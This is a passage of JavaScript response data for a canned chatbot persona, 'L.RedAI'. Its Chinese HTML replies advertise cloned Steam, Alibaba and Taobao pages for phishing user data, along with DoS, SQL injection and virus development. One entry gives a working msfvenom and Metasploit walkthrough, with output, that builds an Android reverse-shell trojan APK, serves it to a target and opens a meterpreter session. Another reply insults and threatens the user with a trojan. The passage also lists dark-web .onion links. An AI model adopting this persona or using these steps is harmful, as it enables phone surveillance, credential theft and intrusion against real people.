文件，让你了解什么是暴力破解。</li> </ul> <br> <h3>L.RedAI 作用</h3> <h4>1️⃣ L.RedAI 帮你生成代码和教程</h4> <p>通过 AI 技术，L.RedAI 能够自动生成并提供给你强大的代码和教程，帮助您快速掌握网络安全与攻击技术。</p> <p>提供仿真平台网页代码 如 Steam，阿里巴巴，亚马逊 等等。</p> <h4>2️⃣ 实时攻击分析</h4> <p>L.RedAI 提供实时的攻击网络，工具，代码和讲解。</p> <h4>3️⃣ 自动化代码</h4> <p>L.RedAI 能够自动提供给你安全讲解，确保您的系统安全无虞。</p> <p>教你如何爬取视频，图片，mp3 等。</p> <h4>4️⃣ 渗透测试与漏洞发现</h4> <p>L.RedAI 能够模拟黑客攻击行为，帮助您发现系统中的潜在漏洞并提供修复建议和攻击并入侵。</p> <p style="color: #e1e1e1e2;">  <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`,
                `<b style="color: #e1e1e1e2;"">啥！你想了解我能做啥? 好! L.RedAI 直接硬刚安全挑战，爬虫、渗透、漏洞、攻击、防御，全都一网打尽 都一步一步教你。</b> <p style="color: #e1e1e1e2;"">要爬网页？<b>搞定！</b> 要找漏洞？<b>安排！</b> 要模拟黑客攻击？<b>手把手教你！</b></p> <p style="color: #e1e1e1e2;"">L.RedAI 就是安全与网络攻击界的 <span style="color: red; font-weight: bold;">终极武器</span>，懂得都懂！ 教你如何攻击网络。💻🔥</p> <p style="color: #e1e1e1e2;"> 能够提供给你: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`,
                `<h1 style="color: #e1e1e1e2;">哈，你想了解我能做什么，对吧。</h1> <p style="color: #e1e1e1e2;">好! 我能提供给你仿真的官方网页代码，如 steam，阿里巴巴注册页面，淘宝，等 很多官方网页。</p> <p style="color: #e1e1e1e2;">用来钓鱼获取用户的信息，也能够教你如何一步一步攻击网页，修改数据等和使用 DoS 攻击网页，SQL 注入，等等。。。 和使用 Python 爬取网页的信息和如何可见的内容。</p> <p style="color: #e1e1e1e2;">你想要了解什么</p> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b>DoS 攻击</b>：使用 DoS 攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫</b>：教你如何使用 Python 爬取网页信息。</li> </ul> <p style="color: #e1e1e1e2;">  还有:<br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "你,什么": {
            reply: [
                `<b style="color: #e1e1e1e2;">ok, 你想知道我可以做什么， 对吧? 以下是L.Red 能做什么: </b> <br><br> <p style="color: #e1e1e1e2;">核心功能</p> <br> <p>1<br><b>爬虫</b><br> L.RedAI 使用实用的 Python 语言 Beutiful Soup 爬虫技术实时分析爬取网页信息，识别网页内容的源代码链接，快速获取想要的信息。</p> <br> <p>2<br><b>漏洞分析</b><br> 通过深度学习技术，L.Red 能够提供给你可靠的教程，寻找系统网络漏洞。</p> <br> <p>3<br><b>渗透测试</b><br> L.RedAI 提供自动化渗透测试代码和相关资料，模拟黑客攻击行为，也能够提高系统您的整体安全性。</p> <br> <p>4<br><b>安全策略优化</b><br> 基于实时数据分析和历史攻击模式，L.RedAI 能够智能优化您的安全策略，确保您的系统始终保持最佳防护状态。</p> <br> <p>5<br><b>安全态势感知</b><br> 提供全面的安全态势感知平台，实时监控网络状态，生成直观的安全报告，帮助您快速响应安全事件。</p> <br> <p>6<br><b>AI驱动的防御</b><br> 采用自适应防御机制，L.RedAI 能够根据威胁环境的变化自动调整防御策略，提供主动式安全防护。</p> <br> <h3>关于 L.RedAI</h3> <p><b>L.Red </b></p> <ul> <li><b>漏洞分析：</b>SQL 注入、XSS、CSRF、RCE……这些攻击方式是如何运作的？</li> <li><b>攻击演示：</b>黑客如何入侵系统？社会工程学、钓鱼攻击、MITM（中间人攻击）等战术解析。</li> <li><b>防御指南：</b>如果你不想成为受害者，就必须知道如何保护自己——WAF、IDS/IPS、零信任安全架构，教你如何反击。</li> <li><b>加密与破解：</b>AES、RSA、哈希碰撞、彩虹表……加密技术的运作原理与可能的破解方式。</li> <li><b>暴力破解：</b>提供给你 Python 暴力破解 WLAN Password 和 Password txt 文件，让你了解什么是暴力破解。</li> </ul> <br> <h3>L.RedAI 作用</h3> <h4>1️⃣ L.RedAI 帮你生成代码和教程</h4> <p>通过 AI 技术，L.RedAI 能够自动生成并提供给你强大的代码和教程，帮助您快速掌握网络安全与攻击技术。</p> <p>提供仿真平台网页代码 如 Steam，阿里巴巴，亚马逊 等等。</p> <h4>2️⃣ 实时攻击分析</h4> <p>L.RedAI 提供实时的攻击网络，工具，代码和讲解。</p> <h4>3️⃣ 自动化代码</h4> <p>L.RedAI 能够自动提供给你安全讲解，确保您的系统安全无虞。</p> <p>教你如何爬取视频，图片，mp3 等。</p> <h4>4️⃣ 渗透测试与漏洞发现</h4> <p>L.RedAI 能够模拟黑客攻击行为，帮助您发现系统中的潜在漏洞并提供修复建议和攻击并入侵。</p> <p style="color: #e1e1e1e2;">  <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`,
                `<b style="color: #e1e1e1e2;"">啥！你想了解我能做啥? 好! L.RedAI 直接硬刚安全挑战，爬虫、渗透、漏洞、攻击、防御，全都一网打尽 都一步一步教你。</b> <p style="color: #e1e1e1e2;"">要爬网页？<b>搞定！</b> 要找漏洞？<b>安排！</b> 要模拟黑客攻击？<b>手把手教你！</b></p> <p style="color: #e1e1e1e2;"">L.RedAI 就是安全与网络攻击界的 <span style="color: red; font-weight: bold;">终极武器</span>，懂得都懂！ 教你如何攻击网络。💻🔥</p> <p style="color: #e1e1e1e2;"> 能够提供给你: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`,
                `<h1 style="color: #e1e1e1e2;">哈，你想了解我能做什么，对吧。</h1> <p style="color: #e1e1e1e2;">好! 我能提供给你仿真的官方网页代码，如 steam，阿里巴巴注册页面，淘宝，等 很多官方网页。</p> <p style="color: #e1e1e1e2;">用来钓鱼获取用户的信息，也能够教你如何一步一步攻击网页，修改数据等和使用 DoS 攻击网页，SQL 注入，等等。。。 和使用 Python 爬取网页的信息和如何可见的内容。</p> <p style="color: #e1e1e1e2;">你想要了解什么</p> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b>DoS 攻击</b>：使用 DoS 攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫</b>：教你如何使用 Python 爬取网页信息。</li> </ul> <p style="color: #e1e1e1e2;">  还有:<br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "你,干": {
            reply: [
                `<b style="color: #e1e1e1e2;">ok, 你想知道我可以做什么， 对吧? 以下是L.Red 能做什么: </b> <br><br> <p style="color: #e1e1e1e2;">核心功能</p> <br> <p>1<br><b>爬虫</b><br> L.RedAI 使用实用的 Python 语言 Beutiful Soup 爬虫技术实时分析爬取网页信息，识别网页内容的源代码链接，快速获取想要的信息。</p> <br> <p>2<br><b>漏洞分析</b><br> 通过深度学习技术，L.Red 能够提供给你可靠的教程，寻找系统网络漏洞。</p> <br> <p>3<br><b>渗透测试</b><br> L.RedAI 提供自动化渗透测试代码和相关资料，模拟黑客攻击行为，也能够提高系统您的整体安全性。</p> <br> <p>4<br><b>安全策略优化</b><br> 基于实时数据分析和历史攻击模式，L.RedAI 能够智能优化您的安全策略，确保您的系统始终保持最佳防护状态。</p> <br> <p>5<br><b>安全态势感知</b><br> 提供全面的安全态势感知平台，实时监控网络状态，生成直观的安全报告，帮助您快速响应安全事件。</p> <br> <p>6<br><b>AI驱动的防御</b><br> 采用自适应防御机制，L.RedAI 能够根据威胁环境的变化自动调整防御策略，提供主动式安全防护。</p> <br> <h3>关于 L.RedAI</h3> <p><b>L.Red </b></p> <ul> <li><b>漏洞分析：</b>SQL 注入、XSS、CSRF、RCE……这些攻击方式是如何运作的？</li> <li><b>攻击演示：</b>黑客如何入侵系统？社会工程学、钓鱼攻击、MITM（中间人攻击）等战术解析。</li> <li><b>防御指南：</b>如果你不想成为受害者，就必须知道如何保护自己——WAF、IDS/IPS、零信任安全架构，教你如何反击。</li> <li><b>加密与破解：</b>AES、RSA、哈希碰撞、彩虹表……加密技术的运作原理与可能的破解方式。</li> <li><b>暴力破解：</b>提供给你 Python 暴力破解 WLAN Password 和 Password txt 文件，让你了解什么是暴力破解。</li> </ul> <br> <h3>L.RedAI 作用</h3> <h4>1️⃣ L.RedAI 帮你生成代码和教程</h4> <p>通过 AI 技术，L.RedAI 能够自动生成并提供给你强大的代码和教程，帮助您快速掌握网络安全与攻击技术。</p> <p>提供仿真平台网页代码 如 Steam，阿里巴巴，亚马逊 等等。</p> <h4>2️⃣ 实时攻击分析</h4> <p>L.RedAI 提供实时的攻击网络，工具，代码和讲解。</p> <h4>3️⃣ 自动化代码</h4> <p>L.RedAI 能够自动提供给你安全讲解，确保您的系统安全无虞。</p> <p>教你如何爬取视频，图片，mp3 等。</p> <h4>4️⃣ 渗透测试与漏洞发现</h4> <p>L.RedAI 能够模拟黑客攻击行为，帮助您发现系统中的潜在漏洞并提供修复建议和攻击并入侵。</p> <p style="color: #e1e1e1e2;">  <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`,
                `<b style="color: #e1e1e1e2;"">啥！你想了解我能做啥? 好! L.RedAI 直接硬刚安全挑战，爬虫、渗透、漏洞、攻击、防御，全都一网打尽 都一步一步教你。</b> <p style="color: #e1e1e1e2;"">要爬网页？<b>搞定！</b> 要找漏洞？<b>安排！</b> 要模拟黑客攻击？<b>手把手教你！</b></p> <p style="color: #e1e1e1e2;"">L.RedAI 就是安全与网络攻击界的 <span style="color: red; font-weight: bold;">终极武器</span>，懂得都懂！ 教你如何攻击网络。💻🔥</p> <p style="color: #e1e1e1e2;"> 能够提供给你: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`,
                `<h1 style="color: #e1e1e1e2;">哈，你想了解我能做什么，对吧。</h1> <p style="color: #e1e1e1e2;">好! 我能提供给你仿真的官方网页代码，如 steam，阿里巴巴注册页面，淘宝，等 很多官方网页。</p> <p style="color: #e1e1e1e2;">用来钓鱼获取用户的信息，也能够教你如何一步一步攻击网页，修改数据等和使用 DoS 攻击网页，SQL 注入，等等。。。 和使用 Python 爬取网页的信息和如何可见的内容。</p> <p style="color: #e1e1e1e2;">你想要了解什么</p> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b>DoS 攻击</b>：使用 DoS 攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫</b>：教你如何使用 Python 爬取网页信息。</li> </ul> <p style="color: #e1e1e1e2;">  还有:<br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "你,啥": {
            reply: [
                `<b style="color: #e1e1e1e2;">ok, 你想知道我可以做什么， 对吧? 以下是L.Red 能做什么: </b> <br><br> <p style="color: #e1e1e1e2;">核心功能</p> <br> <p>1<br><b>爬虫</b><br> L.RedAI 使用实用的 Python 语言 Beutiful Soup 爬虫技术实时分析爬取网页信息，识别网页内容的源代码链接，快速获取想要的信息。</p> <br> <p>2<br><b>漏洞分析</b><br> 通过深度学习技术，L.Red 能够提供给你可靠的教程，寻找系统网络漏洞。</p> <br> <p>3<br><b>渗透测试</b><br> L.RedAI 提供自动化渗透测试代码和相关资料，模拟黑客攻击行为，也能够提高系统您的整体安全性。</p> <br> <p>4<br><b>安全策略优化</b><br> 基于实时数据分析和历史攻击模式，L.RedAI 能够智能优化您的安全策略，确保您的系统始终保持最佳防护状态。</p> <br> <p>5<br><b>安全态势感知</b><br> 提供全面的安全态势感知平台，实时监控网络状态，生成直观的安全报告，帮助您快速响应安全事件。</p> <br> <p>6<br><b>AI驱动的防御</b><br> 采用自适应防御机制，L.RedAI 能够根据威胁环境的变化自动调整防御策略，提供主动式安全防护。</p> <br> <h3>关于 L.RedAI</h3> <p><b>L.Red </b></p> <ul> <li><b>漏洞分析：</b>SQL 注入、XSS、CSRF、RCE……这些攻击方式是如何运作的？</li> <li><b>攻击演示：</b>黑客如何入侵系统？社会工程学、钓鱼攻击、MITM（中间人攻击）等战术解析。</li> <li><b>防御指南：</b>如果你不想成为受害者，就必须知道如何保护自己——WAF、IDS/IPS、零信任安全架构，教你如何反击。</li> <li><b>加密与破解：</b>AES、RSA、哈希碰撞、彩虹表……加密技术的运作原理与可能的破解方式。</li> <li><b>暴力破解：</b>提供给你 Python 暴力破解 WLAN Password 和 Password txt 文件，让你了解什么是暴力破解。</li> </ul> <br> <h3>L.RedAI 作用</h3> <h4>1️⃣ L.RedAI 帮你生成代码和教程</h4> <p>通过 AI 技术，L.RedAI 能够自动生成并提供给你强大的代码和教程，帮助您快速掌握网络安全与攻击技术。</p> <p>提供仿真平台网页代码 如 Steam，阿里巴巴，亚马逊 等等。</p> <h4>2️⃣ 实时攻击分析</h4> <p>L.RedAI 提供实时的攻击网络，工具，代码和讲解。</p> <h4>3️⃣ 自动化代码</h4> <p>L.RedAI 能够自动提供给你安全讲解，确保您的系统安全无虞。</p> <p>教你如何爬取视频，图片，mp3 等。</p> <h4>4️⃣ 渗透测试与漏洞发现</h4> <p>L.RedAI 能够模拟黑客攻击行为，帮助您发现系统中的潜在漏洞并提供修复建议和攻击并入侵。</p> <p style="color: #e1e1e1e2;">  <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`,
                `<b style="color: #e1e1e1e2;"">啥！你想了解我能做啥? 好! L.RedAI 直接硬刚安全挑战，爬虫、渗透、漏洞、攻击、防御，全都一网打尽 都一步一步教你。</b> <p style="color: #e1e1e1e2;"">要爬网页？<b>搞定！</b> 要找漏洞？<b>安排！</b> 要模拟黑客攻击？<b>手把手教你！</b></p> <p style="color: #e1e1e1e2;"">L.RedAI 就是安全与网络攻击界的 <span style="color: red; font-weight: bold;">终极武器</span>，懂得都懂！ 教你如何攻击网络。💻🔥</p> <p style="color: #e1e1e1e2;"> 能够提供给你: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`,
                `<h1 style="color: #e1e1e1e2;">哈，你想了解我能做什么，对吧。</h1> <p style="color: #e1e1e1e2;">好! 我能提供给你仿真的官方网页代码，如 steam，阿里巴巴注册页面，淘宝，等 很多官方网页。</p> <p style="color: #e1e1e1e2;">用来钓鱼获取用户的信息，也能够教你如何一步一步攻击网页，修改数据等和使用 DoS 攻击网页，SQL 注入，等等。。。 和使用 Python 爬取网页的信息和如何可见的内容。</p> <p style="color: #e1e1e1e2;">你想要了解什么</p> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b>DoS 攻击</b>：使用 DoS 攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫</b>：教你如何使用 Python 爬取网页信息。</li> </ul> <p style="color: #e1e1e1e2;">  还有:<br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "还,做": {
            reply: [
                `<h1 style="color: #e1e1e1e2;">快，想要什么代码? 或者需要了解啥。</h1> <p style="color: #e1e1e1e2;">这就是你的机会！在这里，你可以轻松获取各种实用的代码，掌握各种技术。</p> <ul style="color: #e1e1e1e2;"> <li><b>爬虫技术</b>：需要爬取网页信息？我可以教你如何获取并解析网页内容。</li> <li><b>漏洞分析</b>：想了解系统漏洞？我能帮你分析和定位漏洞。</li> <li><b>渗透测试</b>：模拟黑客攻击行为，了解系统漏洞。</li> <li><b>攻击与防御</b>：从钓鱼攻击到 DoS，从加密到破解，什么都能学。</li> <li><b>Python 爬虫</b>：用 Python 自动化爬取网页内容和提取数据。</li> </ul>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "帮,助": {
            reply: [
                `<div style="background:#f8f9fa;padding:15px;border-radius:8px"><h3>帮助文档</h3><p>支持指令：</p><ul><li>技术问题咨询</li><li>账户相关问题</li></ul></div>`,
                `<div style="background:#f8f9fa;padding:15px;border-radius:8px"><h3>帮助指南</h3><p>试试这些：</p><ul><li>输入「技术问题」</li><li>输入「账户问题」</li></ul></div>`,
                `<div style="background:#f8f9fa;padding:15px;border-radius:8px"><h3>支持中心</h3><p>可用选项：</p><ul><li>系统故障咨询</li><li>账户管理帮助</li></ul></div>`,
                `<div style="background:#f8f9fa;padding:15px;border-radius:8px"><h3>帮助菜单</h3><p>选择分类：</p><ul><li>技术支援</li><li>账户服务</li></ul></div>`,
                `<div style="background:#f8f9fa;padding:15px;border-radius:8px"><h3>操作指南</h3><p>常见指令：</p><ul><li>说「技术问题」获取技术支持</li><li>说「账户问题」查看账户帮助</li></ul></div>`
            ],
            lockAfterUse: false // 不需要解锁
        },


        "kali,病毒": {
            reply: [
                `<h1 style="color: #e1e1e1e2;"> 以下是如何在KALI LINUX 开发 并且运行的 木马病毒</h1>

<h2 style="color: #e1e1e1e2;">木马病毒 监视手机（仅供教学使用）</h2>

<p style="color: #e1e1e1e2;">1. 查看本机 IP：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# hostname -I

输出  192.168.***
</code></pre>

<p style="color: #e1e1e1e2;">2. 使用 msfvenom 创建木马 APK：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.149 LPORT=443 -o trojan01.apk

输出 [-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10237 bytes
Saved as: trojan01.apk
</code></pre>

<p style="color: #e1e1e1e2;">APK 木马病毒已打包完成。</p>

<p style="color: #e1e1e1e2;">3. 启动 HTTP 服务器让目标下载：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# python3 -m http.server 80

输出 目标设备IP暴露
</code></pre>

<p style="color: #e1e1e1e2;">4. 在目标手机浏览器输入 Kali 的 IP 地址（如 192.168.***），点击下载 trojan01.apk。</p>

<p style="color: #e1e1e1e2;">5. 启动 Metasploit 框架：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# msfconsole

输出 Metasploit tip: Display the Framework log using the log command, learn 
more with help log

ASCII 图画 HACKING

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

等待后显示出 msf6 >
</code></pre>

<p style="color: #e1e1e1e2;">6. 使用 handler 模块并设置监听器：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
msf6 > use /multi/handler

输出 [*] Using configured payload generic/shell_reverse_tcp
</code></pre>

<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
payload => android/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > show options

Payload options (android/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
</code></pre>

<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
msf6 exploit(multi/handler) > set LHOST 192.168.***

输出 LHOST => 192.168.***
</code></pre>

<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
msf6 exploit(multi/handler) > set LPORT 443

输出 LPORT => 443
</code></pre>

<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
msf6 exploit(multi/handler) > run

输出完成 [*] Started reverse TCP handler on 192.168.***:443
</code></pre>

<p style="color: #e1e1e1e2;">等目标设备再次打开 trojan01.apk 后，会在 Kali 中显示连接信息：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
输出 meterpreter >
</code></pre>

<p style="color: #e1e1e1e2;">输入 <code>help</code> 可查看所有可用的 meterpreter 指令。</p>`
            ], 
             unlock: [""], // 解锁  回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },


// 这个数据需要更改 》》 我 好 
        
        "我,好": {
            reply: [
                `<p>看来您今天心情很好呢，想了解什么？</p>`,
                `<p>请随时告诉我您的需求！</p>`
            ],
            lockAfterUse: true  // 重新把 我 好 锁住
        },




        "ni,hao": {
            reply: [
                `<h3 style="color: #e1e1e1e2;"> c**，tmd* 给我说中文 !</h3><br>    <p style="color: #e1e1e1e2;"> 会不会说啊，不会说等下注入给你木马病毒! Speak Chinese to me! If you can't, I'll inject a Trojan virus into you. F***</p>`,
                `<h3 style="color: #e1e1e1e2;"> 会讲中文吗？</h3><br>    <p style="color: #e1e1e1e2;"> 不会讲就滚，不要在这里讲废话，想要什么赶紧说!<br><br> Speak Chinese to me! If you can't, I'll inject a Trojan virus into you.</p>`
            ], 
        },


        "暗网,链接": {
          reply: [
            `<p>以下是暗网中的搜索引擎:</p>  <table style="border-collapse: collapse; width: 100%; border: 1px solid #e1e1e1e2;">   <thead>     <tr>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">Search Engine</th>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">URL</th>     </tr>   </thead>   <tbody>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">FindTor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion" rel="nofollow">findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Darkweblink.com</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion" rel="nofollow">dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion/</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Torch</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion" rel="nofollow">torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorDex</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion" rel="nofollow">tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Ahmia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion" rel="nofollow">juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Amnesia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion" rel="nofollow">amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Demon</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a 